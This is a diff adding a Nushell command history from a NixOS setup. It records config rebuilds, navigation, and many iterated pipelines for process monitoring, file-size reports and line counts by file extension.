@@ -1,0 +1,5048 @@
+neofetch
+sudo vim .
+sudo nix-os rebuild switch
+sudo nixos rebuild switch
+sudo nixos-rebuild switch
+sudo vim .
+carapace
+carapace chmod nushell
+vi
+vi .
+sudo vim .
+sudo nixos-rebuild switch
+sudo vim .
+sudo nixos-rebuild switch
+chsh -s $(which nu)
+sudo vim .
+cd /etc/nixos
+sudo vim .
+sudo nixos-rebuild switch
+sudo vim .
+sudo nixos-rebuild switch
+sudo vim .
+sudo nixos-rebuild switch
+sudo vim .
+sudo nixos-rebuild switch
+sudo vim .
+sudo nixos-rebuild switch
+sudo vim .
+which nu
+which config.nu
+which nushell
+locate nushell
+locate nu
+dte
+date
+date today
+date now
+neofetch
+sudo vim .
+sudo nixos-rebuild switch
+sudo vim .
+code .
+sudo vim .
+sudo nixos-rebuild switch
+sudo vim .
+sudo nixos-rebuild switch
+neofetch
+clear
+> config env --default | nu-highlight | lines<\n>> config nu --default | nu-highlight | lines
+cd /etc/nixos
+sudo vim .
+sudo ni
+sudo nixos-rebuild switch
+cd /etc/nixos
+sudo nixos-rebuild switch
+carapace
+carapace nushell
+sudo nixos-rebuild switch
+sudo vim .
+sudo nixos-rebuild switch
+sudo vim .
+sudo nixos-rebuild switch
+cd /etc/nixos
+sudo nixos-rebuild switch
+sudo vim .
+sudo nixos-rebuild switch
+clear
+cd ~/.config
+cd /nushell
+cd nushell/
+ls
+vim .
+source nushell
+source nu
+cd ~/.config/nushell
+vi .
+vim .
+source
+cd ~/.config/nushell
+vi .
+vi 
+neovim
+vim .
+vim 
+neovim
+nvim
+cd ~/.config/nushell
+vi .
+vi
+vi .
+cd /etc/nixos
+sudo vi .
+vi .
+def analyze_system [] {<\n>    # Get system processes with memory usage<\n>    let processes = (ps | sort-by cpu | last 10)<\n>    <\n>    # Get disk usage<\n>    let disk = (ls / | where type == "dir" | reduce -f {} {|it, acc|<\n>        let size = (du -d 0 ($it.name) | get apparent)<\n>        $acc | merge {($it.name): $size}<\n>    })<\n>    <\n>    # Get system stats<\n>    let sys = (sys | get host)<\n>    <\n>    # Get memory stats with conversion to GB<\n>    let mem = (sys | get memory | update total {|it| <\n>        $it.total / 1024 / 1024 / 1024 | math round -p 2<\n>    } | update used {|it| <\n>        $it.used / 1024 / 1024 / 1024 | math round -p 2<\n>    })<\n>    <\n>    # Combine all data into a structured report<\n>    {<\n>        timestamp: (date now | date format '%Y-%m-%d %H:%M:%S'),<\n>        system: $sys,<\n>        memory_gb: $mem,<\n>        top_processes: $processes,<\n>        directory_sizes: $disk<\n>    } | to json -i 2 | save system_report.json<\n>    <\n>    # Generate a summary view<\n>    echo $"(ansi green)System Report Generated!(ansi reset)"<\n>    echo $"Total Memory: ($mem.total) GB"<\n>    echo $"Used Memory: ($mem.used) GB"<\n>    echo "Top CPU Processes:"<\n>    $processes | select name cpu mem | first 5<\n>}
+clear
+echo $(http get "https://xkcd.com/info.0.json" | from json | get title) | prepend "Today's XKCD comic: " | save comic.txt<\n>
+http get "https://xkcd.com/info.0.json" | from json | get title | prepend "Today's XKCD comic: " | save comic.txt<\n>
+ls **/* | where type == file | where size > 100mb | sort-by size -r | select name size | update size {|r| $r.size | into string } | move size --before name | into sqlite | query db "SELECT *, SUBSTR('█████████████████████', 1, CAST((CAST(size AS FLOAT) / (SELECT MAX(CAST(size AS FLOAT)) FROM input)) * 20 AS INT)) as bar FROM input" | table
+ls **/* | where type == file | where size > 100mb | sort-by size -r | select name size | update size {|r| $r.size | into string } | move size --before name | into sqlite temp.db | query db "SELECT *, SUBSTR('█████████████████████', 1, CAST((CAST(size AS FLOAT) / (SELECT MAX(CAST(size AS FLOAT)) FROM input)) * 20 AS INT)) as bar FROM input" temp.db | table
+ls **/* | where type == file | where size > 100mb | sort-by size -r | select name size | update size {|r| $r.size | format filesize } | update bar {|r| ("█" * ((($r.size | into filesize) / (ls **/* | where type == file | get size | math max)) * 20 | math round)) } | table
+clear
+ls **/* | where type == file | each { |it| {path: $it.name hash: (open $it.name | hash md5) size: $it.size}} | group-by hash | where {|it| ($it.value | length) > 1} | each { |it| {hash: $it.hash duplicates: ($it.value | length) total_wasted: (($it.value | get size | math sum) - ($it.value | get size | math min)) paths: ($it.value | get path)}} | sort-by total_wasted -r | first 10
+ls **/* | where type == file | sort-by size -r | first 10 | select name size | update size {|f| $f.size | format filesize}
+ps | sort-by memory -r | first 10 | update memory {|p| $"($p.memory)%" } | select pid name memory cpu
+ps | sort-by mem -r | first 10 | update mem {|p| $"($p.mem)%" } | select pid name mem cpu
+ps | sort-by mem -r | first 10 | update power_level {|p| $"(($p.mem | into int) / 10 | into int)★"} | update name {|p| if $p.mem > 400 {'超サイヤ人 ' + $p.name} else if $p.mem > 200 {'戦士 ' + $p.name} else {$p.name} } | select name power_level mem cpu | update power_level {|p| ("╰" + "━" * (($p.mem / 50) | math round | into int) + "⚡")}
+ps | sort-by mem -r | first 10 | update name {|p| if $p.mem > 400 {'超サイヤ人 ' + $p.name} else if $p.mem > 200 {'戦士 ' + $p.name} else {$p.name} } | update power {|p| ("╰" + "━" * (($p.mem / 50) | math round | into int) + "⚡")} | select name power mem cpu
+ps | sort-by mem -r | first 10 | update name {|p| if ($p.mem | into int) > 400000 {'超サイヤ人 ' + $p.name} else if ($p.mem | into int) > 200000 {'戦士 ' + $p.name} else {$p.name} } | update power {|p| ("╰" + "━" * (($p.mem | into int) / 50000 | math round | into int) + "⚡")} | select name power mem cpu
+# Create a custom command that generates random anime stats<\n>def "anime stats" [] {<\n>    # Sample anime data<\n>    let anime_data = [<\n>        [title power_level status episodes genre]; <\n>        ["One Piece" 9001 "Ongoing" 1000+ "Shonen"]<\n>        ["Naruto" 8500 "Completed" 720 "Shonen"]<\n>        ["Dragon Ball Z" 9999 "Completed" 291 "Shonen"]<\n>        ["Death Note" 7500 "Completed" 37 "Psychological"]<\n>        ["Attack on Titan" 8900 "Completed" 87 "Dark Fantasy"]<\n>        ["My Hero Academia" 8200 "Ongoing" 113 "Shonen"]<\n>        ["Demon Slayer" 8700 "Ongoing" 44 "Dark Fantasy"]<\n>        ["Jujutsu Kaisen" 8800 "Ongoing" 46 "Dark Fantasy"]<\n>    ]<\n><\n>    # Process and display anime stats with fancy formatting<\n>    $anime_data <\n>    | where power_level > 8000 <\n>    | sort-by power_level <\n>    | each { |row| <\n>        {<\n>            title: $row.title<\n>            power_level: $"(ansi red_bold)($row.power_level)(ansi reset)"<\n>            status: if $row.status == "Ongoing" { <\n>                $"(ansi green_bold)($row.status)(ansi reset)" <\n>            } else { <\n>                $"(ansi yellow)($row.status)(ansi reset)" <\n>            }<\n>            episodes: $row.episodes<\n>            genre: $"(ansi cyan)($row.genre)(ansi reset)"<\n>        }<\n>    }<\n>    | table<\n>    | prepend $"(ansi magenta_bold)IT'S OVER 8000!!!(ansi reset)"<\n>}<\n><\n># Usage: anime stats
+clear
+ls **/* | where type == file | sort-by size -r | first 10 | select name size | update size { |it| $it.size | into filesize }
+ps | where mem > (100 * 1024 * 1024) | select name cpu mem | update mem { |it| $it.mem / 1024 / 1024 / 1024 } | update cpu { |it| $it.cpu / 100.0 } | sort-by mem -r | update mem { |it| $"($it.mem | into string -d 2)GB" } | update cpu { |it| $"($it.cpu | into string -d 1)%" } | table -e | ansi gradient --shape rainbow
+ls **/* | where type == "file" | sort-by modified -r | first 20 | select name size modified | update size { |it| $it.size | into filesize } | sort-by size -r
+ls **/* | where type == "file" | each { |it| {name: $it.name, hash: (open $it.name | hash md5)} } | group-by hash | where { |it| ($it.value | length) > 1 }
+ps | sort-by memory -r | first 10 | select pid name memory cpu | update memory { |it| $it.memory | into filesize }
+ps | sort-by mem -r | first 10 | select pid name mem cpu | update mem { |it| $it.mem | into filesize }
+ls **/* | where type == "file" | group-by extension | each { |it| {ext: $it.key, size: ($it.value | get size | math sum | into filesize), count: ($it.value | length)} } | sort-by size -r
+git log --stat | lines | window 2 | reduce -f [] { |it, acc| if ($it.0 | str starts-with 'commit ') { $acc | append {hash: ($it.0 | str substring 7..14), author: ($it.1 | str replace 'Author: ' ''), changes: (seq 2 10 | each { |n| if ($it | get $n | str contains '|') {1} {0} } | math sum) } } { $acc } } | sort-by changes -r | first 10
+loop { ps | sort-by cpu -r | first 5 | select pid name cpu memory | update memory { |it| $it.memory | into filesize } | insert timestamp (date now) | rotate 5 | print $in; sleep 2sec } | window 5 | each { |it| {process: $it.name, cpu_trend: ($it | get cpu | math stddev | math round -p 2)} }
+def --wrapped track_growth [] { let start = (ps | select pid name memory); sleep 5min; let end = (ps | select pid name memory); $end | join $start pid -k pid | where {|it| $it.memory_1 > $it.memory_0 } | update {growth: ($it.memory_1 - $it.memory_0 | into filesize)} | sort-by growth -r }; loop { track_growth | first 10 }
+loop { ps | sort-by cpu -r | first 5 | select pid name cpu memory | update memory { |it| $it.memory | into filesize } | insert timestamp (date now) | rotate 5; sleep 2sec } | window 5 | each { |it| {process: $it.name, cpu_trend: ($it | get cpu | math stddev | math round -p 2)} }
+loop { ps | sort-by cpu -r | first 5 | select pid name cpu memory | update memory { |it| $it.memory | into filesize } | insert timestamp (date now) } | window 5 | each { |it| {<\n>    process: $it.name,<\n>    cpu_trend: ($it | get cpu | math stddev | math round -p 2),<\n>    avg_memory: ($it | get memory | math avg | into filesize),<\n>    peak_cpu: ($it | get cpu | math max)<\n>} } | sort-by cpu_trend -r
+loop { ps | sort-by cpu -r | first 5 | select pid name cpu memory | update memory { |it| $it.memory | into filesize } | insert timestamp (date now); sleep 2sec } | window 5 | each { |it| {process: $it.name.0, cpu_trend: ($it | get cpu | math stddev | math round -p 2)} }
+loop { <\n>    ps | sort-by cpu -r | first 5 | <\n>    select pid name cpu memory | <\n>    update memory { |it| $it.memory | into filesize } | <\n>    insert timestamp (date now); <\n>    sleep 2sec <\n>} | window 5 | each { |it| {<\n>    process: $it.name.0,<\n>    cpu_trend: ($it | get cpu | math stddev | math round -p 2),<\n>    memory_trend: ($it | get memory | str replace -a 'B' '' | str replace -a ' ' '' | into int | math stddev | into filesize),<\n>    peak_cpu: ($it | get cpu | math max),<\n>    samples: ($it | length)<\n>} } | where cpu_trend > 0.5 | sort-by cpu_trend -r
+while true { ps | sort-by cpu -r | first 5 | select pid name cpu memory | update memory { |it| $it.memory | into filesize }; sleep 2sec }
+while true { ps | sort-by cpu -r | first 5 | select pid name cpu mem | update mem { |it| $it.mem | into filesize }; sleep 2sec }
+def --env get_system_stats [] {<\n>    {<\n>        top_cpu: (ps | sort-by cpu -r | first 5 | select pid name cpu mem | update mem {|it| $it.mem | into filesize}),<\n>        sys_load: (sys | get host.load_average),<\n>        total_mem: ((sys | get mem.total | into filesize) + " / " + (sys | get mem.free | into filesize) + " free"),<\n>        timestamp: (date now | date format '%H:%M:%S')<\n>    }<\n>}<\n><\n>def format_header [] { <\n>    $"(ansi rb)╭──── System Monitor ────────────────────────────╮(ansi reset)" <\n>}<\n><\n>def format_footer [ts: string] { <\n>    $"(ansi rb)╰──── Updated: ($ts) ────────────────────╯(ansi reset)" <\n>}<\n><\n>while true { <\n>    clear<\n>    let stats = (get_system_stats)<\n>    print (format_header)<\n>    print $"\n(ansi green)CPU Hungry Processes:(ansi reset)"<\n>    $stats.top_cpu | table<\n>    print $"\n(ansi yellow)System Load: ($stats.sys_load)(ansi reset)"<\n>    print $"(ansi cyan)Memory: ($stats.total_mem)(ansi reset)"<\n>    print (format_footer $stats.timestamp)<\n>    sleep 2sec <\n>}
+clear
+while true { ps | sort-by cpu -r | first 5 | select pid name cpu memory | update memory { |it| $it.memory | into filesize }; sleep 2sec }
+while true { ps | sort-by cpu -r | first 5 | select pid name cpu mem | update mem { |it| $it.mem | into filesize }; sleep 2sec }
+ps | where cpu > 0.1 | select pid name cpu mem | update mem {|it| $it.mem | into filesize } | sort-by cpu -r | merge { sys: (sys | get host.load_average) } | first 5
+ps | where cpu > 0.1 | select pid name cpu mem | update mem {|it| $it.mem | into filesize } | sort-by cpu -r | first 5
+ps | where cpu > 0.1 | select pid name cpu mem | update mem {|it| $it.mem | into filesize } | sort-by cpu -r | first 5 | insert load (sys | get loadavg)
+ps | where cpu > 0.1 | select pid name cpu mem | update mem {|it| $it.mem | into filesize } | sort-by cpu -r | first 5 | insert sys_info {loadavg: (sys | get loadavg), uptime: (sys | get uptime)}
+ps | where cpu > 0.1 | select pid name cpu mem | update mem {|it| $it.mem | into filesize } | sort-by cpu -r | first 5
+ls **/* | where type == "file" | get name | split row '.' | last | uniq -c | sort-by count -r | first 10
+sys | get host | select hostname cpu_cores os kernel_version | transpose key value
+ls | sort-by size -r | first 10 | select name size | update size { |it| $it.size | into filesize }
+ps | where cpu > 1.0 | update mem {|it| $it.mem | into filesize } | select pid name cpu mem | sort-by cpu -r | first 5 | update cpu {|it| ($it.cpu | into string) + '%' }
+ps | where cpu > 1.0 | update mem {|it| $it.mem | into filesize } | select pid name cpu mem | sort-by cpu -r | first 5 | update cpu {|it| ($it.cpu | into string) + '%' } | transpose
+neofecth
+neofetch
+cd ~/projects/sequence/sequence
+ls
+tree
+ls
+vi README.md
+cd ..
+ls | transpose
+ls | transpose | transpose
+ls | transpose | transpose | transpose
+ls | transpose | transpose | transpose | transpose
+clear
+nutshell
+nix-env -p nutshell
+neofetch
+ls | select name | par-each { |it| <\n>  let ext = ($it.name | path extension)<\n>  let lines = (open --raw $it.name | lines | length)<\n>  {name: $it.name, extension: $ext, lines: $lines}<\n>} | group-by extension | transpose extension files | each { |it| <\n>  {language: $it.extension, <\n>   file_count: ($it.files | length), <\n>   total_lines: ($it.files | reduce -f 0 { |it, acc| $acc + $it.lines })}<\n>} | sort-by total_lines -r | table
+ls | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (open --raw $it.name | lines | length) } } | group-by ext | transpose ext files | each { |it| { language: $it.ext, file_count: ($it.files | length), total_lines: ($it.files | reduce -f 0 { |it, acc| $acc + $it.lines }) } } | sort-by total_lines -r | table
+cd ~/projects
+ls | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (open --raw $it.name | lines | length) } } | group-by ext | transpose ext files | each { |it| { language: $it.ext, file_count: ($it.files | length), total_lines: ($it.files | reduce -f 0 { |it, acc| $acc + $it.lines }) } } | sort-by total_lines -r | table
+ls | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (open --raw $it.name | lines | length) } } | group-by ext | each { |it| { language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |it, acc| $acc + $it.lines }) } } | sort-by total_lines -r | table
+ls | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (try { open --raw $it.name | lines | length } catch { 0 }) } } | group-by ext | transpose ext files | each { |it| { language: $it.ext, file_count: ($it.files | length), total_lines: ($it.files | reduce -f 0 { |f, acc| $acc + $f.lines }) } } | sort-by total_lines -r | table
+ls -R | where type == 'File' | group-by extension | each { { Extension: .name, Files: (.items | length), Lines: (.items | get name | each { wc -l $it | get stdout | str trim | into int } | math sum) } } | to-table<\n>
+ls | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open --raw $it.name | lines | length } catch { 0 }) } } | group-by ext | items { |ext, files| { language: $ext, file_count: ($files | length), total_lines: ($files | reduce -f 0 { |f, acc| $acc + $f.lines }) } } | sort-by total_lines -r | table
+ls --recursive | where type == 'File' | group-by extension | each { { Extension: .name, Files: (.items | length), Lines: (.items | get name | each { wc -l $it | str trim | into int } | math sum) } } | to-table<\n>
+ls | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open --raw $it.name | lines | length } catch { 0 }) } } | group-by ext | items { |ext, files| { language: $ext, file_count: ($files | length), total_lines: ($files | reduce -f 0 { |f, acc| $acc + $f.lines }) } } | sort-by total_lines -r | table
+ls | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | each { |it| { language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) } } | sort-by total_lines -r | table
+ls --recursive | where type == 'File' | group-by extension | each { { Extension: .name, Files: (.items | length), Lines: (.items | get name | each { wc -l $it | str trim | into int } | math sum) } } | to-table<\n>
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | each { |it| { language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) } } | sort-by total_lines -r | table
+ls | filter {|it| $it.type == file } | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | transpose ext files | each { |it| { language: $it.ext, file_count: ($it.files | length), total_lines: ($it.files | reduce -f 0 { |f, acc| $acc + $f.lines }) } } | sort-by total_lines -r
+ls | where type == file | lines-of-code
+nu --version
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | reduce -f {} { |acc, it| $acc | insert $it.key { language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) } } | transpose key value | sort-by value.total_lines -r | select value
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | reduce -f {} { |acc, it| $acc | insert $it.key ({ language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) }) } | transpose key value | sort-by value.total_lines -r | select value
+echo $nu.config-path
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | reduce -f {} { |acc, it| $acc | insert $it.key ({ language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) }) } | transpose | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | reduce -f {} { |acc, it| $acc | insert $it.key ({ language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) }) } | transpose key value | sort-by value.total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | reduce -f {} { |acc, it| $acc | insert $it.key ({ language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) }) } | transpose | sort-by total_lines -r
+nu --version
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | reduce -f {} { |acc, it| $acc | insert $it.key ({ language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) }) } | transpose | sort-by total_lines -r
+nu --help
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | reduce -f {} { |acc, it| $acc | insert $it.key ({ language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) }) } | transpose key value | sort-by value.total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | reduce -f {} { |acc, it| $acc | insert $it.key ({ language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) }) }
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | each { |it| { language: $it.key, file_count: ($it.items | length), total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | to-df | filter lines > 0
+ls
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } }
+ls | where type == file
+ls
+cd rustup
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } }
+cd rustup
+ls | where type == file
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } }
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path extension), lines: (do { open $it.name | lines | length } catch { 0 }) } } | group-by ext | to-df | filter lines > 0
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (do { open $it.name | lines | length } catch { 0 }) } }
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (do { open $it.name | is-not-empty | lines | length } catch { 0 }) } }
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (do { open --raw $it.name | lines | length } catch { 0 }) } }
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (do { open $it.name | from-lines | length } catch { 0 }) } }
+ls | where type == file | each { |it| $it.name }
+cd..
+cd ..
+ls
+cd raylib
+ls | where type == file | each { |it| $it.name }
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | each { |it| { language: $it.key, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | update total_lines { |it| $it.total_lines } | sort-by total_lines -r | each { |it| $it | merge { lines_percent: (($it.total_lines / ($in | calculate total_lines sum)) * 100 | math round 2), files_percent: (($it.file_count / ($in | calculate file_count sum)) * 100 | math round 2) } }
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | each { |it| { language: $it.key, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+cd ..
+ls
+cd clones
+ls
+cd ..
+cd tauri
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+cd ..
+ls
+cd ziglings.org
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+ls
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+ls | sort-by modified<\n>
+ls | select name modified | sort-by modified<\n>
+ls | select name type | sort-by type
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+ls
+cd projects
+ls
+cd sih1.0
+ls
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+ls
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |acc, f| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | reduce -f {} { |acc, group| $acc | insert $group.0.ext ($group | each { |it| $it.lines } | math sum) } | transpose | each { |it| { language: $it.column0, total_lines: $it.column1, file_count: ($it.column1 | length) } } | sort-by total_lines -r
+ls
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | each { |ext, files| { language: $ext, total_lines: ($files | reduce -f 0 { |acc, f| $acc + $f.lines }), file_count: ($files | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | each { |it| { language: $it.column0, total_lines: ($it.column1 | reduce -f 0 { |acc, f| $acc + $f.lines }), file_count: ($it.column1 | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | items { |ext, files| { language: $ext, total_lines: ($files | reduce -f 0 { |acc, f| $acc + $f.lines }), file_count: ($files | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | reduce -f {} { |acc, group| $acc | insert ($group.0.ext) ($group | each { |it| $it.lines } | math sum) } | transpose | each { |it| { language: $it.column0, total_lines: $it.column1, file_count: ($it.column1 | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | to record | transpose | each { |it| { language: $it.column0, total_lines: ($it.column1 | reduce -f 0 { |acc, f| $acc + $f.lines }), file_count: ($it.column1 | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | each { |it| { language: $it.column0, total_lines: ($it.column1 | reduce -f 0 { |acc, f| $acc + $f.lines }), file_count: ($it.column1 | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | items { |ext, files| { language: $ext, total_lines: ($files | reduce -f 0 { |acc, f| $acc + $f.lines }), file_count: ($files | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | reduce -f {} { |acc, key, group| $acc | insert $key ($group | reduce -f 0 { |a, it| $a + $it.lines }) } | transpose | each { |it| { language: $it.column0, total_lines: $it.column1, file_count: 0 } } | sort-by total_lines -r
+nu --version
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | reduce -f {} { |acc, key, group| $acc | insert $key ($group | each { |it| $it.lines } | math sum) } | transpose | each { |it| { language: $it.column0, total_lines: $it.column1, file_count: ($it.column1 | length) } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | reduce -f {} { |acc, key, group| $acc | insert $key { total_lines: ($group | each { |it| $it.lines } | math sum), file_count: ($group | length) } } | transpose | each { |it| { language: $it.column0, total_lines: $it.column1.total_lines, file_count: $it.column1.file_count } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | reduce -f {} { |acc, key, group| $acc | insert $key ($group | each { |it| $it.lines } | math sum) } | transpose | each { |it| { language: $it.column0, total_lines: $it.column1, file_count: 1 } } | sort-by total_lines -r
+ls
+cd ..
+mkdir python
+cd python
+ls
+touch hi.py
+ls
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | reduce -f {} { |acc, key, group| $acc | insert $key ($group | each { |it| $it.lines } | math sum) } | transpose | each { |it| { language: $it.column0, total_lines: $it.column1, file_count: 1 } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | reduce -f {} { |acc, key, group| $acc | insert $key ($group | reduce -f 0 { |a, it| $a + $it.lines }) } | transpose | each { |it| { language: $it.column0, total_lines: $it.column1, file_count: 0 } } | sort-by total_lines -r
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+cd ..
+ls
+cd yacine
+ls | where type == file | each { |it| { name: $it.name, ext: ($it.name | path parse).extension, lines: (open $it.name | lines | length) } } | group-by ext | transpose | rename language items | each { |it| { language: $it.language, total_lines: ($it.items | reduce -f 0 { |f, acc| $acc + $f.lines }), file_count: ($it.items | length) } } | sort-by total_lines -r
+cd ..
+ls
+cd zigwasm
+ls
